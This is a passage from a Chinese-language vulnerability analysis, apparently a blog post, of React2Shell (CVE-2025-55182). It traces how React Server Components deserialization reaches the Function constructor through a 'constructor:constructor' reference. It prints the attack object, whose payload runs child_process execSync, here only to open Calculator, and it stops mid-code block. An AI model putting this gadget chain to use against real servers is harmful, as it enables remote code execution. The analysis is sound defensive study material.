+&lt;p&gt;&lt;code&gt;createModel()&lt;/code&gt; 函数直接返回传入的 model 参数，所以 &lt;code&gt;getOutlinedModel()&lt;/code&gt;函数最终返回 Chunk 对象自定义的 then函数，也就是递归调用的 &lt;strong&gt;reviveModel()_1_1&lt;/strong&gt; 函数最终返回上述 then 函数。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;reviveModel()_0&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_0.png"
+width="1075"
+height="389"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_0_hu_8155194394bdbccc.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_0_hu_4946732d6a3d67aa.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="276"
+data-flex-basis="663px"
+&gt;&lt;/p&gt;
+&lt;p&gt;回到表层&lt;code&gt;reviveModel()&lt;/code&gt;函数，parentObj 接收上述 then 函数作为新值并赋值给 &lt;code&gt;value&lt;/code&gt; 的 then 属性。&lt;code&gt;value&lt;/code&gt; 由请求表单中第1个参数值 JSON 反序列化得到。&lt;/p&gt;
+&lt;p&gt;继续 for 循环遍历 &lt;code&gt;value&lt;/code&gt; 的各属性：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;“status” 属性的值“resolved_model”是字符串，且没有以“$”开头，所以其被原封不动返回&lt;/li&gt;
+&lt;li&gt;“reason” 属性值为数值型 -1，直接返回&lt;/li&gt;
+&lt;li&gt;“value” 属性同上&lt;/li&gt;
+&lt;li&gt;“_response” 属性是一个非 Array 类型对象，跟进递归调用的 &lt;code&gt;reviveModel()&lt;/code&gt; 函数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;reviveModel()_1_5&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5.png"
+width="1079"
+height="413"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_hu_d769a2600eeaad06.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_hu_c6c28cc9551ecc0f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="261"
+data-flex-basis="627px"
+&gt;&lt;/p&gt;
+&lt;p&gt;与表层reviveModel相同，&lt;code&gt;value&lt;/code&gt; 是一个 Object 对象，所以再次进入递归调用：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;_prefix 属性：值为字符串，且没有以“$”开头，返回原值&lt;/li&gt;
+&lt;li&gt;_formData 属性：值为非 Array 类型的对象，再次进入 &lt;code&gt;reviveModel()&lt;/code&gt; 函数递归调用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;reviveModel()_2_2&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_2.png"
+width="1065"
+height="413"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_2_hu_740e289b680eb718.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_2_hu_65f955693495631e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="257"
+data-flex-basis="618px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0:_response:_formData:get&lt;/code&gt; 值为字符串 &lt;code&gt;&amp;quot;$1:constructor:constructor&amp;quot;&lt;/code&gt;，所以同上将会：&lt;code&gt;reviveModel()&lt;/code&gt; =&amp;gt; &lt;code&gt;parseModelString()&lt;/code&gt; =&amp;gt; &lt;code&gt;getOutlinedModel()&lt;/code&gt;，跟进 &lt;code&gt;getOutlinedModel()&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;getOutlinedModel()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_3.png"
+width="1051"
+height="335"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_3_hu_81b8493430eb73cd.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_3_hu_91cb3e8d92f3f23c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="313"
+data-flex-basis="752px"
+&gt;&lt;/p&gt;
+&lt;p&gt;字符串 &lt;code&gt;&amp;quot;$1:constructor:constructor&amp;quot;&lt;/code&gt;被分割为包含三个元素的数组，id 被赋值为数字&lt;code&gt;1&lt;/code&gt;，进入&lt;code&gt;getChunk()&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_4.png"
+width="1055"
+height="309"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_4_hu_af6eb0cf1130353c.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_4_hu_26fcccbacb29e122.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="341"
+data-flex-basis="819px"
+&gt;&lt;/p&gt;
+&lt;p&gt;与前两次不同，这次使用传入的 id 作为 key可以取出 &lt;code&gt;_chunks[1]&lt;/code&gt;，所以&lt;code&gt;_chunks[1]&lt;/code&gt;被直接返回。&lt;/p&gt;
+&lt;p&gt;回到 &lt;code&gt;getOutlinedModel()&lt;/code&gt;，&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_4.png"
+width="1043"
+height="357"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_4_hu_78bc246c9968fd50.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_4_hu_4b8ee240b108789a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="292"
+data-flex-basis="701px"
+&gt;&lt;/p&gt;
+&lt;p&gt;因为 &lt;code&gt;_chunks[1].status&lt;/code&gt; 已经是 “fulfilled”，所以不再进入“resolved_model”分支，直接进入“fulfilled”分支，&lt;code&gt;parentObject&lt;/code&gt; 被赋值为&lt;code&gt;_chunks[1].value&lt;/code&gt;， 也就是 &lt;code&gt;_chunks[2748]&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;第一次循环，取出 reference 第2个元素&lt;code&gt;'constructor'&lt;/code&gt;作为 key取出 &lt;code&gt;_chunks[2748].constructor&lt;/code&gt; ，值为：&lt;code&gt;[Function: Promise]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;第二次循环，取出 reference 第2个元素&lt;code&gt;'constructor'&lt;/code&gt;作为 key取出&lt;code&gt;[Function: Promise].constructor&lt;/code&gt; ，值为：&lt;code&gt;[Function: Function]&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;循环结束，&lt;code&gt;getOutlinedModel()&lt;/code&gt;函数结束，递归调用的 &lt;strong&gt;reviveModel()_2_2&lt;/strong&gt; 函数最终返回&lt;code&gt;[Function: Function]&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;reviveModel()_1_5&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_2.png"
+width="1069"
+height="439"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_2_hu_625d4fa4851e889e.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_2_hu_cfc7eb8b102a3e7a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="243"
+data-flex-basis="584px"
+&gt;&lt;/p&gt;
+&lt;p&gt;回到 &lt;code&gt;reviveModel()_1_5&lt;/code&gt;，&lt;code&gt;0:_response:_formData:get&lt;/code&gt;的值被更新为&lt;code&gt;[Function: Function]&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;回到表层&lt;code&gt;reviveModel()&lt;/code&gt;，&lt;code&gt;value&lt;/code&gt; 元素遍历结束， &lt;code&gt;value&lt;/code&gt; 此时值如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;then:&lt;/span&gt; &lt;span class="err"&gt;function&lt;/span&gt; &lt;span class="err"&gt;(resolve,&lt;/span&gt; &lt;span class="err"&gt;reject)&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;switch&lt;/span&gt; &lt;span class="err"&gt;(this.status)&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;case&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;resolved_model&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;initializeModelChunk(this);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;switch&lt;/span&gt; &lt;span class="err"&gt;(this.status)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;case&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;fulfilled&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;resolve(this.value);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;break;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;pending&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;blocked&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;cyclic&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;resolve&lt;/span&gt; &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="err"&gt;===&lt;/span&gt; &lt;span class="err"&gt;this.value&lt;/span&gt; &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="err"&gt;(this.value&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="err"&gt;)&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;this.value.push(resolve));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;reject&lt;/span&gt; &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;(null&lt;/span&gt; &lt;span class="err"&gt;===&lt;/span&gt; &lt;span class="err"&gt;this.reason&lt;/span&gt; &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="err"&gt;(this.reason&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="err"&gt;[]),&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;this.reason.push(reject));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;break;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;default:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;reject(this.reason);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;status:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;resolved_model&amp;#34;&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;reason:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;value:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;{\&amp;#34;then\&amp;#34;:\&amp;#34;$B\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_response:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_prefix:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;open -a Calculator&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;_formData:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;get:&lt;/span&gt; &lt;span class="err"&gt;function&lt;/span&gt; &lt;span class="err"&gt;Function()&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt; &lt;span class="err"&gt;[native&lt;/span&gt; &lt;span class="err"&gt;code]&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以看到，当前 &lt;code&gt;value&lt;/code&gt; 除了确实不是一个 Chunk 实例之外，基本跟一个 Chunk 实例没什么区别。&lt;/p&gt;
+&lt;p&gt;回到梦开始的地方：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;initializeModelChunk()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_5.png"
+width="1051"
+height="495"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_5_hu_2a09a99f6e173acc.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_5_hu_628b5c9788565660.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="212"
+data-flex-basis="509px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;_chunks[0]&lt;/code&gt; 的 status 属性被修改为“fulfilled”，value 属性被修改为上述 &lt;code&gt;value&lt;/code&gt; 值。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;initializeModelChunk()&lt;/code&gt;函数结束，回到回调的 &lt;code&gt;then()&lt;/code&gt; 函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/then.png"
+width="967"
+height="218"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/then_hu_d449932b769e388f.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/then_hu_8706cb34e2d808f7.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="443"
+data-flex-basis="1064px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;_chunks[0].status&lt;/code&gt; 等于“fulfilled”，上述 &lt;code&gt;value&lt;/code&gt; 被 &lt;code&gt;resolve&lt;/code&gt;。于是进入 &lt;code&gt;value.then()&lt;/code&gt;。&lt;/p&gt;
+&lt;h3 id="35-valuethen回调"&gt;3.5 value.then回调
+&lt;/h3&gt;&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then.png"
+width="897"
+height="223"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_hu_3edc9b40d82a3ac.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_hu_c7cc4bcc2564f0b7.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="402"
+data-flex-basis="965px"
+&gt;&lt;/p&gt;
+&lt;p&gt;进入&lt;strong&gt;initializeModelChunk()&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_6.png"
+width="981"
+height="439"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_6_hu_9413ffda4c11f200.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_6_hu_3acf3bc9f0593844.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="223"
+data-flex-basis="536px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;value&lt;/code&gt; 的 &lt;code&gt;status&lt;/code&gt; 属性修改为“cyclic”，&lt;code&gt;value.reason&lt;/code&gt;和&lt;code&gt;value.value&lt;/code&gt;都修改为 &lt;code&gt;null&lt;/code&gt;。而后，&lt;code&gt;value._response&lt;/code&gt;、原 &lt;code&gt;value.value&lt;/code&gt;进行 JSON 反序列化获得的对象 、&lt;code&gt;chunk.reason&lt;/code&gt;的字符串值传入 &lt;code&gt;reviveModel()&lt;/code&gt;函数。&lt;/p&gt;
+&lt;p&gt;跟前文一样，因为&lt;code&gt;value.value&lt;/code&gt;被反序列化为以下非 Array 类型对象，所以&lt;code&gt;reviveModel()&lt;/code&gt;函数将会递归调用，遍历该对象的每个属性。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;then:&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;$B&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;跳过重复部分，跟进递归调用：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_1.png"
+width="1051"
+height="245"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_1_hu_506476bd0adf03f6.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_1_hu_c7f51f49a2e306f4.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="428"
+data-flex-basis="1029px"
+&gt;&lt;/p&gt;
+&lt;p&gt;因为当前 value 值&lt;code&gt;$B&lt;/code&gt;是字符串，所以进入 &lt;code&gt;parseModelString()&lt;/code&gt;函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_v.png"
+width="1087"
+height="311"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_v_hu_1eee1312f4044329.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_v_hu_873c222ebef9e5.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="349"
+data-flex-basis="838px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;case &amp;quot;B&amp;quot;&lt;/code&gt; ，返回 &lt;code&gt;response._formData.get(response._prefix + obj)&lt;/code&gt;。前面已知：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;value._response._formData.get&lt;/code&gt; 值为 &lt;code&gt;[Function: Function]&lt;/code&gt;，是所有函数的构造函数。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;value._response._prefix&lt;/code&gt; 值为原始传入的恶意 payload&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以 &lt;code&gt;parseModelString()&lt;/code&gt;函数将返回一个&lt;strong&gt;函数体为上述指定恶意代码的匿名函数&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;回到reviveMode()` 函数，&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v.png"
+width="1077"
+height="395"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_hu_9f596dd0c169b0cb.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_hu_d8e572599235deaf.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="272"
+data-flex-basis="654px"
+&gt;&lt;/p&gt;
+&lt;p&gt;上述对象的&lt;code&gt; then&lt;/code&gt; 属性值从 &lt;code&gt;&amp;quot;$B&amp;quot;&lt;/code&gt; 被替换为上述匿名函数。&lt;/p&gt;
+&lt;p&gt;回到 &lt;code&gt;initializeModelChunk()&lt;/code&gt; 函数，&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_7.png"
+width="1031"
+height="477"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_7_hu_f44f50eaacbc63d9.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_7_hu_68ded0f860263ca9.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="216"
+data-flex-basis="518px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;value.status&lt;/code&gt; 修改为 “fulfilled”，&lt;code&gt;value.value&lt;/code&gt; 修改为以下对象：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;then:&lt;/span&gt; &lt;span class="err"&gt;function&lt;/span&gt; &lt;span class="err"&gt;anonymous()&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
